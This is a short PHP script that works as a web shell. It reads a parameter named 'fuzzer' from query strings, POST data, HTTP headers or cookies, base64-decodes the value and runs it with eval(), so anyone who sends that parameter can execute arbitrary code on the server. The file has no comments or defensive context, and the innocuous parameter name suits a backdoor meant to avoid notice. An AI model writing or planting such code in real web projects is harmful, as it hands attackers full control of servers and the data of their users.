<?php

const PARAM = "fuzzer";

$g = $_GET;
$p = $_POST;
$h = getallheaders();
$c = $_COOKIE;

$arr = [$g, $p, $h, $c];

foreach ($arr as $i) {
	if (isset($i[PARAM])) {
		eval(base64_decode($i[PARAM]));
	}
}

